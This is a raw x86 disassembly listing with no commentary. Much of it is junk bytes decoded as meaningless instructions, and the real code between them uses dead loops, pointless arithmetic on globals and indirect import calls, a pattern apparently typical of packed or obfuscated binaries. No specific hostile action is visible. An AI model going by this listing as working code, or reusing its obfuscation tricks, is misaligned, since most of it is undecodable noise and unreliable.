  407339:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40733a:	mov    ah,0x99
  40733c:	les    ebx,FWORD PTR [eax+0x13]
  40733f:	mov    cl,0xc
  407341:	cwde   
  407342:	sbb    DWORD PTR [ecx],ebx
  407344:	out    0xba,al
  407346:	inc    esi
  407347:	mov    cl,0xb6
  407349:	je     0x406f76
  40734f:	leave  
  407350:	ret    0x4
  407353:	push   ebp
  407354:	mov    ebp,esp
  407356:	sub    esp,0x2c
  407359:	and    DWORD PTR ds:0x433757,0x5787
  407363:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40736a:	mov    eax,ds:0x43382b
  40736f:	or     DWORD PTR ds:0x43382f,eax
  407375:	jmp    0x40759d
  40737a:	pop    edx
  40737b:	cmp    al,0x59
  40737d:	inc    ebx
  40737e:	pop    ecx
  40737f:	arpl   WORD PTR [eax-0x1b],sp
  407382:	js     0x407389
  407384:	push   esi
  407385:	loope  0x4073b8
  407387:	push   ds
  407388:	arpl   WORD PTR [ebx],bx
  40738a:	or     al,dl
  40738c:	jle    0x40740c
  40738e:	add    eax,0x857e7e7c
  407393:	fadd   QWORD PTR [esi+0x322767b2]
  407399:	jnp    0x407401
  40739b:	adc    al,0x8b
  40739d:	std    
  40739e:	lds    esi,FWORD PTR [ebp+0x319f3fa7]
  4073a4:	clc    
  4073a5:	inc    eax
  4073a6:	push   es
  4073a7:	daa    
  4073a8:	xor    ch,BYTE PTR [ebp+0x3185e54b]
  4073ae:	repnz add bp,sp
  4073b2:	sbb    BYTE PTR [ecx],0x23
  4073b5:	popf   
  4073b6:	imul   ebx,DWORD PTR [ecx],0x23bfe2b9
  4073bc:	dec    ecx
  4073bd:	push   ds
  4073be:	push   ecx
  4073bf:	pop    esp
  4073c0:	fwait
  4073c1:	lods   eax,DWORD PTR ds:[esi]
  4073c2:	xor    BYTE PTR [eax],dh
  4073c4:	mov    eax,0x9c3ea985
  4073c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073ca:	out    dx,al
  4073cb:	test   DWORD PTR [esi+eiz*8-0x3d],esi
  4073cf:	pop    esi
  4073d0:	add    bh,bl
  4073d2:	int    0xd0
  4073d4:	inc    edi
  4073d5:	pushf  
  4073d6:	psrlw  mm2,QWORD PTR [ebx+0x2c8fff5f]
  4073dd:	jmp    0xca27ef41
  4073e2:	ins    BYTE PTR es:[edi],dx
  4073e3:	addr16 dec ecx
  4073e5:	push   0xffffffff
  4073e7:	cld    
  4073e8:	sub    DWORD PTR [esi+eiz*2+0x1c],edx
  4073ec:	push   0x22
  4073ee:	jmp    0x7a297f6e
  4073f3:	dec    esi
  4073f4:	std    
  4073f5:	call   0x58fb:0x7643d81e
  4073fc:	arpl   WORD PTR [ecx-0x18],bx
  4073ff:	fdivp  st(5),st
  407401:	cmp    esp,DWORD PTR [eax+0x1c]
  407404:	scas   eax,DWORD PTR es:[edi]
  407405:	dec    ecx
  407406:	(bad)  [edi+0x58]
  407409:	leave  
  40740a:	fisttp WORD PTR [edi+0x418448c2]
  407410:	test   eax,0xc4882867
  407415:	pop    esi
  407416:	mov    eax,ds:0x988c8710
  40741b:	add    al,0x1
  40741d:	xlat   BYTE PTR ds:[ebx]
  40741e:	dec    ecx
  40741f:	push   ebx
  407420:	cwde   
  407421:	sub    BYTE PTR [esi-0x3b],bh
  407424:	inc    ebx
  407425:	icebp  
  407426:	fwait
  407427:	scas   al,BYTE PTR es:[edi]
  407428:	lock sbb al,0xc2
  40742b:	pop    ebx
  40742c:	fidiv  DWORD PTR [edx]
  40742e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40742f:	adc    edi,ebp
  407431:	adc    eax,0x65a8027
  407436:	aas    
  407437:	xor    DWORD PTR [esp+esi*8],edx
  40743a:	sti    
  40743b:	mov    esp,0x475ac321
  407440:	lock push cs
  407442:	dec    ecx
  407443:	repz loope 0x407482
  407446:	not    BYTE PTR [eax+ecx*2]
  407449:	retf   0x9996
  40744c:	and    ebp,ebp
  40744e:	(bad)  
  40744f:	sbb    BYTE PTR [edi],0x97
  407452:	ins    BYTE PTR es:[edi],dx
  407453:	mov    bl,0x33
  407455:	lea    ebp,[ebx+0x41d6049c]
  40745b:	add    ebx,ecx
  40745d:	sahf   
  40745e:	mov    ss,WORD PTR [eax]
  407460:	aam    0xdc
  407462:	push   ecx
  407463:	jmp    0x4074d2
  407465:	lods   al,BYTE PTR ds:[esi]
  407466:	cmp    eax,0x1bdc5da1
  40746b:	test   eax,0xbfe05cb6
  407470:	lahf   
  407471:	pop    es
  407472:	int    0x6
  407474:	jle    0x4074b9
  407476:	enter  0x7d78,0x85
  40747a:	xchg   edi,eax
  40747b:	push   cs
  40747c:	pop    ebx
  40747d:	mov    dh,0x5
  40747f:	loop   0x407434
  407481:	clc    
  407482:	cmp    bh,dl
  407484:	and    BYTE PTR [eax+edx*2-0x7a],bl
  407488:	pop    ds
  407489:	(bad)  
  40748a:	mov    eax,0x1ce5837c
  40748f:	jp     0x4074d6
  407491:	sub    dh,dl
  407493:	inc    ebx
  407494:	leave  
  407495:	lds    esp,FWORD PTR [ebx-0x4e]
  407498:	xchg   DWORD PTR [ecx],edx
  40749a:	mov    bl,0xf4
  40749c:	push   0xbec1d159
  4074a1:	push   ds
  4074a2:	fs sub eax,0x25408fdf
  4074a8:	popf   
  4074a9:	push   ss
  4074aa:	outs   dx,DWORD PTR ds:[esi]
  4074ab:	lahf   
  4074ac:	out    dx,eax
  4074ad:	sbb    esi,DWORD PTR [ebp+0x72]
  4074b0:	retf   
  4074b1:	and    eax,DWORD PTR [esi]
  4074b3:	sar    ecx,cl
  4074b5:	in     al,dx
  4074b6:	lods   eax,DWORD PTR ds:[esi]
  4074b7:	test   al,0x44
  4074b9:	push   edx
  4074ba:	mov    esi,0x30613118
  4074bf:	hlt    
  4074c0:	and    ah,dh
  4074c2:	ins    DWORD PTR es:[edi],dx
  4074c3:	mov    ecx,0x321ebf5
  4074c8:	or     BYTE PTR [ebp-0x24],bh
  4074cb:	push   esp
  4074cc:	stc    
  4074cd:	dec    esi
  4074ce:	jns    0x40750f
  4074d0:	dec    edx
  4074d1:	icebp  
  4074d2:	cmp    BYTE PTR [ebx-0x7a14c0a1],al
  4074d8:	xchg   DWORD PTR [eax],ebp
  4074da:	or     DWORD PTR [ebx],esp
  4074dc:	mov    ds:0xd0968ceb,al
  4074e1:	mov    edx,0xe8fa556e
  4074e6:	call   0xab2a:0x5a22eeb2
  4074ed:	ins    DWORD PTR es:[edi],dx
  4074ee:	or     BYTE PTR [ebp-0x12],dl
  4074f1:	adc    esi,DWORD PTR [ecx]
  4074f3:	rcl    DWORD PTR [eax-0x4595dd6b],cl
  4074f9:	mov    ch,0x49
  4074fb:	sti    
  4074fc:	data16 aaa 
  4074fe:	mov    ecx,ebx
  407500:	push   cs
  407501:	out    dx,al
  407502:	add    BYTE PTR [edx+0x4b205c74],al
  407508:	fsubr  DWORD PTR [eax+0x65e35b99]
  40750e:	xchg   esi,eax
  40750f:	xor    ecx,ebp
  407511:	sbb    DWORD PTR [ebp+0x7b],ebp
  407514:	add    edi,DWORD PTR [edx+0x38]
  407517:	push   eax
  407518:	or     dl,ch
  40751a:	cdq    
  40751b:	dec    eax
  40751c:	into   
  40751d:	icebp  
  40751e:	hlt    
  40751f:	mov    ebx,0x5a800a9a
  407524:	in     al,dx
  407525:	jno    0x407506
  407527:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407528:	pop    edi
  407529:	(bad)  
  40752b:	jle    0x4074f7
  40752d:	pop    ecx
  40752e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40752f:	stc    
  407530:	test   DWORD PTR [ebx-0x22],ebx
  407533:	adc    BYTE PTR ds:0xebb6866d,ch
  407539:	push   ds
  40753a:	sbb    DWORD PTR [ecx-0x2a8ad7bc],0x69b5aab1
  407544:	pusha  
  407545:	(bad)  
  407547:	cmc    
  407548:	sbb    al,0x6e
  40754a:	jmp    eax
  40754c:	mov    ch,bh
  40754e:	mov    ds:0x77b0783e,al
  407553:	lock push esp
  407555:	ja     0x407546
  407557:	rol    BYTE PTR [edx-0x33],1
  40755a:	xchg   esp,eax
  40755b:	out    0xdb,al
  40755d:	jmp    0x57c5:0x530ab3f
  407564:	cmp    eax,0x305129ad
  407569:	push   0x74
  40756b:	scas   eax,DWORD PTR es:[edi]
  40756c:	out    dx,al
  40756d:	addr16 sub eax,0x81f95537
  407573:	fcmovu st,st(5)
  407575:	inc    esp
  407576:	adc    DWORD PTR [edi],ecx
  407578:	cld    
  407579:	jae    0x4075ce
  40757b:	es ret 0xed63
  40757f:	mov    ch,0xf4
  407581:	test   BYTE PTR [ecx-0x7f1c3e55],cl
  407587:	ins    BYTE PTR es:[edi],dx
  407588:	mov    DWORD PTR [edx],edx
  40758a:	sub    al,0x32
  40758c:	ds jnp 0x40757d
  40758f:	xchg   ecx,eax
  407590:	(bad)  
  407592:	pop    edi
  407593:	jg     0x407612
  407595:	inc    esp
  407596:	fisttp WORD PTR [edi]
  407598:	popa   
  407599:	retf   
  40759a:	retf   0x8ea9
  40759d:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4075a4:	xor    eax,0x551
  4075a9:	mov    eax,0x9577
  4075ae:	mov    ecx,DWORD PTR ds:0x433753
  4075b4:	sub    DWORD PTR ds:0x43370f,ecx
  4075ba:	mov    WORD PTR [ebp-0x4],ax
  4075be:	and    ecx,0x22ab
  4075c4:	lea    eax,[ebp-0x24]
  4075c7:	sub    ecx,DWORD PTR ds:0x4336ff
  4075cd:	mov    DWORD PTR [ebp-0x28],eax
  4075d0:	mov    eax,DWORD PTR [ebp+0x8]
  4075d3:	and    DWORD PTR ds:0x43376b,0x78d4
  4075dd:	mov    DWORD PTR [ebp-0x20],eax
  4075e0:	and    DWORD PTR ds:0x43370f,0x0
  4075ea:	jmp    0x4075fc
  4075ef:	mov    ecx,DWORD PTR ds:0x43370f
  4075f5:	inc    ecx
  4075f6:	mov    DWORD PTR ds:0x43370f,ecx
  4075fc:	cmp    DWORD PTR ds:0x43370f,0x1c
  407603:	jae    0x40763a
  407609:	cmp    DWORD PTR ds:0x43370f,0x21
  407610:	jne    0x40762f
  407616:	push   DWORD PTR [ebp-0x18]
  407619:	push   0x26d9
  40761e:	push   DWORD PTR [ebp-0x1c]
  407621:	push   0x600b
  407626:	push   DWORD PTR [ebp-0x14]
  407629:	call   DWORD PTR ds:0x412348
  40762f:	jmp    0x4075ef
  407634:	xor    ecx,0x31bd
  40763a:	push   ebx
  40763b:	lea    eax,[ebp-0x18]
  40763e:	mov    DWORD PTR [ebp-0x1c],eax
  407641:	mov    eax,DWORD PTR [ebp-0x1c]
  407644:	jmp    0x40786c
  407649:	aad    0xb8
  40764b:	(bad)  
  40764c:	shl    BYTE PTR [ebx-0x20],0x75
  407650:	dec    ecx
  407651:	js     0x407697
  407653:	js     0x407668
  407655:	jns    0x407609
  407657:	in     eax,0x1d
  407659:	adc    eax,eax
  40765b:	jle    0x4076db
  40765d:	add    eax,0xde7e7e7c
  407662:	jecxz  0x40767c
  407664:	cmc    
  407665:	push   0xffffff9a
  407667:	push   ds
  407668:	or     BYTE PTR [edx+edx*4-0x5d],dl
  40766c:	jmp    0x407641
  40766e:	aam    0xd
  407670:	xchg   BYTE PTR [ecx-0x69],ah
  407673:	jb     0x4076b1
  407675:	test   BYTE PTR [edx+edi*1-0x3154978e],0xd9
  40767d:	fwait
  40767e:	mov    cl,bh
  407680:	ins    BYTE PTR es:[edi],dx
  407681:	mov    BYTE PTR [ebx],ch
  407683:	push   esi
  407684:	or     eax,0x519876b6
  407689:	sub    bl,BYTE PTR cs:[ebx-0x26]
  40768d:	hlt    
  40768e:	push   eax
  40768f:	mov    al,0xd9
  407691:	js     0x407711
  407693:	mov    dh,0x86
  407695:	push   0xffffffc6
  407697:	fidivr WORD PTR ds:0x417b6530
  40769d:	daa    
  40769e:	pushf  
  40769f:	(bad)  
  4076a0:	popa   
  4076a1:	test   BYTE PTR [ecx],dh
  4076a3:	ds out 0x75,eax
  4076a6:	xlat   BYTE PTR ds:[ebx]
  4076a7:	imul   edx,DWORD PTR [ebx],0xbb85bee
  4076ad:	loope  0x407688
  4076af:	in     al,dx
  4076b0:	jmp    0x5213:0xd976e92c
  4076b7:	icebp  
  4076b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076b9:	push   ecx
  4076ba:	cmp    ecx,DWORD PTR [edi]
  4076bc:	cs je  0x407650
  4076bf:	inc    BYTE PTR [edi]
  4076c1:	or     bl,bh
  4076c3:	pop    es
  4076c4:	cld    
  4076c5:	pushf  
  4076c6:	mov    ah,0xf6
  4076c8:	or     ebp,DWORD PTR [edi-0x2a01e486]
  4076ce:	xchg   ebx,eax
  4076cf:	and    eax,0xdfdb8756
  4076d4:	jo     0x40770a
  4076d6:	in     al,dx
  4076d7:	xor    DWORD PTR [ebx],ebx
  4076d9:	std    
  4076da:	push   esi
  4076db:	mov    al,0xb5
  4076dd:	icebp  
  4076de:	sahf   
  4076df:	jmp    0x1f36ba53
  4076e4:	out    0xc1,eax
  4076e6:	adc    al,0xef
  4076e8:	popf   
  4076e9:	sub    ebp,DWORD PTR [ecx]
  4076eb:	sub    edi,esp
  4076ed:	cmp    al,0xc
  4076ef:	mov    cl,0x77
  4076f1:	es pushf 
  4076f3:	mov    dh,BYTE PTR [esi]
  4076f5:	ret    
  4076f6:	sbb    DWORD PTR [ebx-0x72],ecx
  4076f9:	inc    ebp
  4076fa:	push   edx
  4076fb:	repz push edi
  4076fd:	jle    0x4076ad
  4076ff:	xchg   ebp,eax
  407700:	(bad)  
  407702:	xlat   BYTE PTR ds:[ebx]
  407703:	sbb    BYTE PTR [ebp+0x3863b797],ch
  407709:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40770b:	and    eax,0x9e3281b3
  407710:	inc    ebx
  407711:	sbb    al,0x2a
  407713:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407714:	stos   DWORD PTR es:[edi],eax
  407715:	dec    edx
  407716:	cmp    DWORD PTR [eax-0x76],eax
  407719:	icebp  
  40771a:	pop    ss
  40771b:	aas    
  40771c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40771d:	mov    ch,0x97
  40771f:	(bad)  
  407720:	add    ecx,edx
  407722:	sub    esp,DWORD PTR [esi+ebp*2]
  407725:	into   
  407726:	push   ds
  407727:	jno    0x407767
  407729:	jg     0x4076db
  40772b:	push   ecx
  40772c:	push   edx
  40772d:	add    DWORD PTR [eax*8-0x137bf089],0x7429fded
  407738:	xchg   edx,eax
  407739:	jns    0x407709
  40773b:	arpl   WORD PTR [esi+edi*4+0x70c42844],cx
  407742:	adc    bl,BYTE PTR [ecx-0x344e58c1]
  407748:	sar    al,1
  40774a:	add    eax,0x93f78e9b
  40774f:	mov    esi,0x887f365a
  407754:	cli    
  407755:	jmp    FWORD PTR [esi+edi*1+0x4]
  407759:	loopne 0x40770a
  40775b:	jbe    0x4076e9
  40775d:	pop    es
  40775e:	inc    eax
  40775f:	add    eax,0x6b825a8c
  407764:	xchg   ebx,eax
  407765:	jg     0x407700
  407767:	stos   BYTE PTR es:[edi],al
  407768:	mov    edx,0x7a96d580
  40776d:	mov    ch,0x8d
  40776f:	xor    BYTE PTR [edx-0x7af1eb26],ah
  407775:	ins    DWORD PTR es:[edi],dx
  407776:	add    al,0xfa
  407778:	ret    0x4b6c
  40777b:	xchg   esi,eax
  40777c:	(bad)  
  40777d:	inc    edx
  40777e:	loop   0x4077d1
  407780:	xor    DWORD PTR [edx],esp
  407782:	lods   al,BYTE PTR ds:[esi]
  407783:	push   edi
  407784:	ins    DWORD PTR es:[edi],dx
  407785:	icebp  
  407786:	enter  0x611,0xf2
  40778a:	or     esp,DWORD PTR [ebx-0x755b20d5]
  407790:	mov    ss,WORD PTR [edi-0x6c]
  407793:	std    
  407794:	scas   eax,DWORD PTR es:[edi]
  407795:	ins    BYTE PTR es:[edi],dx
  407796:	inc    eax
  407797:	sub    esi,DWORD PTR [esi+0x7]
  40779a:	push   ss
  40779b:	or     BYTE PTR [ebx+0x11],dl
  40779e:	fadd   QWORD PTR [eax]
  4077a0:	pop    edx
  4077a1:	xor    ebp,DWORD PTR [esi+0x3d]
  4077a4:	lea    esp,[edi-0x7e]
  4077a7:	enter  0x2db2,0xb9
  4077ab:	mov    ebp,0xe45c704c
  4077b0:	pop    eax
  4077b1:	popf   
  4077b2:	mov    esp,0x5480f8c
  4077b7:	scas   eax,DWORD PTR es:[edi]
  4077b8:	xlat   BYTE PTR ds:[ebx]
  4077b9:	ret    0x15e0
  4077bc:	call   0x464a:0xec28f961
  4077c3:	pop    edx
  4077c4:	js     0x407797
  4077c6:	jbe    0x4077ed
  4077c8:	adc    eax,0x7bf75c03
  4077cd:	jecxz  0x4077f8
  4077cf:	stos   DWORD PTR es:[edi],eax
  4077d0:	rcr    DWORD PTR [edi],0x2a
  4077d3:	add    al,dh
  4077d5:	inc    eax
  4077d6:	arpl   di,bp
  4077d8:	adc    edi,DWORD PTR [edi+edx*2+0x62]
  4077dc:	aam    0xd4
  4077de:	jmp    0xa7dad109
  4077e3:	cmp    DWORD PTR [esi],ebx
  4077e5:	jge    0x4077ed
  4077e7:	add    bl,BYTE PTR [edi+0x7c]
  4077ea:	add    dl,BYTE PTR [edx]
  4077ec:	cs push ds
  4077ee:	outs   dx,DWORD PTR ds:[esi]
  4077ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077f0:	shl    DWORD PTR [esi+0x61c8593c],1
  4077f6:	(bad)  
  4077f8:	pusha  
  4077f9:	test   eax,0x8102cace
  4077fe:	mov    al,0x47
  407800:	out    dx,eax
  407801:	fdiv   DWORD PTR [edx]
  407803:	xchg   edx,eax
  407805:	cmp    BYTE PTR [esi-0x3d],bl
  407808:	jno    0x40783e
  40780a:	mov    bl,BYTE PTR [ebp+0x48]
  40780d:	push   eax
  40780e:	das    
  40780f:	pop    ecx
  407810:	push   esi
  407811:	js     0x407850
  407813:	aaa    
  407814:	fwait
  407815:	mov    dl,BYTE PTR [eax-0x16852e80]
  40781b:	repz cs and eax,0xec8fb83b
  407822:	adc    ch,BYTE PTR [edx+0x2390a875]
  407828:	aam    0x4e
  40782a:	aad    0xa3
  40782c:	adc    BYTE PTR [esi+edi*4+0x5],al
  407830:	popa   
  407831:	loopne 0x4077d6
  407833:	scas   al,BYTE PTR es:[edi]
  407834:	out    dx,eax
  407835:	(bad)  
  407836:	ds in  eax,0x46
  407839:	and    bh,bh
  40783b:	adc    al,BYTE PTR [ecx+0x1d]
  40783e:	ja     0x40787e
  407840:	cdq    
  407841:	aas    
  407842:	jae    0x407825
  407844:	inc    esp
  407845:	sub    DWORD PTR [ebx],esp
  407847:	push   esp
  407848:	cdq    
  407849:	add    BYTE PTR [ecx+0x1b],dh
  40784c:	ror    DWORD PTR [eax-0x15],1
  40784f:	sub    cl,dl
  407851:	mov    ebx,0x5da1345
  407856:	vandnps ymm6,ymm5,ymm6
  40785a:	dec    eax
  40785b:	jle    0x4078d2
  40785d:	ficom  DWORD PTR [esi-0x36]
  407860:	lods   eax,DWORD PTR ds:[esi]
  407861:	gs push edx
  407863:	test   eax,0xf187d9ee
  407868:	mov    WORD PTR ds:0x2b5692cd,ds
  40786e:	into   
  40786f:	push   edi
  407870:	mov    edi,0xf89f2da9
  407875:	xor    DWORD PTR ds:0x4336ff,0x433763
  40787f:	mov    DWORD PTR [eax],edi
  407881:	mov    DWORD PTR ds:0x43381b,0x12
  40788b:	cmp    DWORD PTR ds:0x43381b,0x0
  407892:	je     0x4078c1
  407898:	cmp    DWORD PTR ds:0x43381b,0x14
  40789f:	jne    0x4078b1
  4078a5:	push   DWORD PTR [ebp-0x28]
  4078a8:	push   DWORD PTR [ebp-0x1c]
  4078ab:	call   DWORD PTR ds:0x41234c
  4078b1:	mov    eax,ds:0x43381b
  4078b6:	dec    eax
  4078b7:	mov    ds:0x43381b,eax
  4078bc:	jmp    0x40788b
  4078c1:	mov    eax,DWORD PTR [ebp-0x14]
  4078c4:	mov    ebx,DWORD PTR [ebp-0x8]
  4078c7:	and    DWORD PTR ds:0x43379f,0x0
  4078d1:	xor    esi,esi
  4078d3:	xor    esi,DWORD PTR ds:0x43379f
  4078d9:	inc    esi
  4078da:	mov    DWORD PTR ds:0x43379f,esi
  4078e0:	cmp    DWORD PTR ds:0x43379f,0x1c
  4078e7:	jne    0x4078f6
  4078ed:	push   DWORD PTR [ebp-0x28]
  4078f0:	call   DWORD PTR ds:0x4120d0
  4078f6:	cmp    DWORD PTR ds:0x43379f,0x18
  4078fd:	jb     0x4078d1
  407903:	xor    esi,0x6b5
  407909:	mov    ecx,0x7510854
  40790e:	neg    esi
  407910:	jmp    0x407b38
  407915:	loopne 0x4078c8
  407917:	test   DWORD PTR [edx+0x71f1b255],esi
  40791d:	cmp    dh,cl
  40791f:	pop    ebp
  407920:	out    0x74,eax
  407922:	inc    esp
  407923:	add    ch,BYTE PTR [esp-0x32]
  407927:	jle    0x4079a7
  407929:	add    eax,0x357e7e7c
  40792e:	inc    esp
  40792f:	sbb    al,0x2b
  407931:	pushf  
  407932:	aad    0x3e
  407934:	aam    0x38
  407936:	push   cs
  407937:	outs   dx,BYTE PTR gs:[esi]
  407939:	adc    al,0x6c
  40793b:	int    0x51
  40793d:	das    
  40793e:	cdq    
  40793f:	ret    
  407940:	or     DWORD PTR [edi-0x68],ecx
  407943:	jg     0x4078fa
  407945:	mov    bh,0xbe
  407947:	mov    eax,0x1daa8259
  40794c:	inc    ecx
  40794d:	imul   ebp,edi,0x72eae76a
  407953:	jno    0x407978
  407955:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407956:	mov    bl,0x54
  407958:	and    ch,BYTE PTR [esi-0x7f]
  40795b:	in     eax,dx
  40795c:	and    eax,0x48ad7820
  407961:	stos   BYTE PTR es:[edi],al
  407962:	out    dx,eax
  407963:	mov    esi,0xb6b689f2
  407968:	adc    al,0x85
  40796a:	mov    bh,0x58
  40796c:	pop    ss
  40796d:	push   ebp
  40796e:	ins    DWORD PTR es:[edi],dx
  40796f:	push   esi
  407970:	les    edi,FWORD PTR [ebp+0x6b8e97e3]
  407976:	in     al,0x11
  407978:	cpuid  
  40797a:	dec    edi
  40797b:	outs   dx,DWORD PTR ds:[esi]
  40797c:	mov    eax,ds:0x15a724f6
  407981:	js     0x407904
  407983:	add    eax,0x1734d5dd
  407988:	fldenv [ecx]
  40798a:	lods   al,BYTE PTR ds:[esi]
  40798b:	test   DWORD PTR gs:[esi],edi
  40798e:	or     DWORD PTR [esi],edi
  407990:	(bad)
  407994:	inc    eax
  407995:	add    bl,BYTE PTR [edi]
  407997:	push   eax
  407998:	xchg   esp,eax
  407999:	jmp    0x6e1c:0xc88d5826
  4079a0:	cwde   
  4079a1:	gs in  al,0x3b
  4079a4:	clc    
  4079a5:	jae    0x407934
  4079a7:	and    al,0x61
  4079a9:	jle    0x40792c
  4079ab:	pop    ebp
  4079ac:	out    0x1f,eax
  4079ae:	les    ebp,FWORD PTR [eax]
  4079b0:	test   al,0xc7
  4079b2:	dec    eax
  4079b3:	mov    edx,0xb9f67856
  4079b8:	jb     0x407986
  4079ba:	dec    edi
  4079bb:	pop    esi
  4079bc:	mov    cl,0x61
  4079be:	or     BYTE PTR [edx-0x199c7cfd],dl
  4079c4:	daa    
  4079c5:	inc    ecx
  4079c6:	inc    ebp
  4079c7:	xchg   esp,eax
  4079c8:	push   edi
  4079c9:	push   es
  4079ca:	fdivr  QWORD PTR [edi+0x24889e4f]
  4079d0:	fisubr DWORD PTR [edx]
  4079d2:	iret   
  4079d3:	xchg   edi,eax
  4079d4:	data16 (bad) 
  4079d6:	xor    BYTE PTR [esi+edi*2-0xf3f7970],dh
  4079dd:	xor    esi,DWORD PTR [eax]
  4079df:	or     BYTE PTR [ecx-0x7cc170f],bl
  4079e5:	or     al,0x7d
  4079e7:	jns    0x407991
  4079e9:	into   
  4079ea:	xor    eax,0xe47c2f6c
  4079ef:	push   ebp
  4079f0:	in     al,0x95
  4079f2:	add    al,al
  4079f4:	jno    0x4079a4
  4079f6:	popa   
  4079f7:	daa    
  4079f8:	adc    DWORD PTR [esi+ecx*2],eax
  4079fb:	cwde   
  4079fc:	add    esp,DWORD PTR [ebx-0x10]
  4079ff:	cmp    dl,ah
  407a01:	hlt    
  407a02:	dec    edi
  407a03:	push   esi
  407a04:	rcr    esp,0xda
  407a07:	cdq    
  407a08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a09:	mov    dh,0x4
  407a0b:	dec    edi
  407a0c:	add    BYTE PTR [ecx+0xf],ch
  407a0f:	dec    esi
  407a10:	pushf  
  407a11:	push   0xaa0519f1
  407a16:	lods   al,BYTE PTR ds:[esi]
  407a17:	jbe    0x4079d1
  407a19:	bound  eax,QWORD PTR [edi]
  407a1b:	push   edx
  407a1c:	fisub  DWORD PTR [eax+0x39]
  407a1f:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  407a21:	add    eax,0xa74f5483
  407a26:	mov    dh,cl
  407a28:	mov    dl,0x6a
  407a2a:	add    cl,BYTE PTR [esi+0xf082ab9]
  407a30:	ds std 
  407a32:	lds    edi,FWORD PTR ds:0xf851687
  407a38:	xor    DWORD PTR [ebx],0x39
  407a3b:	dec    edx
  407a3c:	mov    esp,0x220c9220
  407a41:	inc    ecx
  407a42:	sub    eax,DWORD PTR [ebx+0x36]
  407a45:	mov    ebp,0x154a1411
  407a4a:	aaa    
  407a4b:	in     al,dx
  407a4c:	retf   
  407a4d:	or     al,0x49
  407a4f:	ret    
  407a50:	mov    DWORD PTR [edx],esi
  407a52:	mov    ds:0x6413543e,al
  407a57:	sahf   
  407a58:	mov    ecx,0x9595e08a
  407a5d:	rol    ah,0xeb
  407a60:	xor    al,0x5
  407a62:	int3   
  407a63:	adc    bh,bh
  407a65:	jnp    0x407a08
  407a67:	push   esp
  407a68:	inc    eax
  407a69:	fldpi  
  407a6b:	xlat   BYTE PTR ds:[ebx]
  407a6c:	mov    bl,0x50
  407a6e:	or     esi,ecx
  407a70:	pop    ebp
  407a71:	(bad)  
  407a72:	hlt    
  407a73:	fisub  WORD PTR ds:0x1061bc23
  407a79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a7a:	push   esp
  407a7b:	mov    ebx,0x936e88cc
  407a80:	enter  0x752,0xb9
  407a84:	test   dh,ah
  407a86:	shr    DWORD PTR [ecx],0xb9
  407a89:	out    dx,al
  407a8a:	mov    esp,0xc4e94d5d
  407a8f:	iret   
  407a90:	push   ebp
  407a91:	pop    ebp
  407a92:	pusha  
  407a93:	push   edi
  407a94:	dec    edx
  407a95:	or     DWORD PTR [ebx+0x7084e4df],ebp
  407a9b:	mov    ds:0xbb0d52e,al
  407aa0:	jle    0x407a28
  407aa2:	xchg   ecx,eax
  407aa3:	lea    ecx,es:[edx-0x18]
  407aa7:	dec    edi
  407aa8:	pushf  
  407aa9:	test   DWORD PTR [edx],edi
  407aab:	mov    ch,BYTE PTR ds:0xe3c8c13e
  407ab1:	jge    0x407a4d
  407ab3:	push   edx
  407ab4:	pop    ebx
  407ab5:	pop    esi
  407ab6:	sahf   
  407ab7:	nop
  407ab8:	outs   dx,BYTE PTR ds:[esi]
  407ab9:	xchg   ebx,eax
  407aba:	aad    0x2e
  407abc:	ins    BYTE PTR es:[edi],dx
  407abd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407abe:	int    0x91
  407ac0:	jne    0x407a92
  407ac2:	sti    
  407ac3:	ja     0x407a77
  407ac5:	fld    DWORD PTR [esi]
  407ac7:	mov    ds:0xb10e37b2,eax
  407acc:	ss push es
  407ace:	sbb    DWORD PTR [edi-0x38],edx
  407ad1:	test   al,0x8a
  407ad3:	pusha  
  407ad4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ad5:	clc    
  407ad6:	pop    edx
  407ad7:	into   
  407ad8:	add    ah,BYTE PTR [ebx]
  407ada:	push   eax
  407adb:	lahf   
  407adc:	sbb    eax,0x81af34f2
  407ae1:	std    
  407ae2:	sub    DWORD PTR [ebp+edx*8+0x5b889aa6],esi
  407ae9:	dec    edx
  407aea:	pop    ds
  407aeb:	xchg   edi,ebx
  407aed:	pop    edi
  407aee:	mov    DWORD PTR ds:0x9de09481,0x1a304ed3
  407af8:	mov    edi,0x44be21ff
  407afd:	or     ebx,DWORD PTR [ebp+0x4d]
  407b00:	pop    ss
  407b01:	xor    eax,0xb8d05d77
  407b06:	in     eax,0x29
  407b08:	mov    ebp,0x1bfd2c55
  407b0d:	push   edi
  407b0e:	arpl   WORD PTR [eax+0x6e],bx
  407b11:	dec    edi
  407b12:	mov    ds:0xedc7e632,eax
  407b17:	nop
  407b18:	jae    0x407b78
  407b1a:	inc    edx
  407b1b:	mov    dh,0x63
  407b1d:	je     0x407b21
  407b1f:	xchg   ebx,eax
  407b20:	mov    ecx,0xec1c600a
  407b25:	out    0x71,eax
  407b27:	stos   BYTE PTR es:[edi],al
  407b28:	fs in  al,dx
  407b2a:	xor    BYTE PTR [edx],dl
  407b2c:	sahf   
  407b2d:	add    bl,BYTE PTR [ecx-0x7b4f2cb7]
  407b33:	lock neg DWORD PTR [edi-0x3ecc8a01]
  407b3a:	adc    DWORD PTR ds:0x4337ab,0x1c6e
  407b44:	mov    esi,0x32729b
  407b49:	mov    DWORD PTR ds:0x433753,0x57a0
  407b53:	xor    ebx,ecx
  407b55:	add    DWORD PTR ds:0x433707,0x7d23
  407b5f:	xor    edx,edx
